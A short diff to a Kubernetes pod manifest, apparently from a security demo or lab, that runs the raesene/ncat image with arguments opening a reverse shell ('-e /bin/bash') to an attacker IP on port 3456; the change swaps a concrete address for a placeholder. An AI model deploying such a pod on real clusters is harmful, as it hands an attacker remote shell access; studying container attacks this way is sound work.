@@ -9,4 +9,4 @@ spec:
   containers:
     - name: rs-pod
       image: raesene/ncat
-      args: ["192.168.0.110", "3456", "-e", "/bin/bash"] # IP address is attacker IP
+      args: ["IP_ADDRESS", "3456", "-e", "/bin/bash"] # IP address is attacker IP, change it
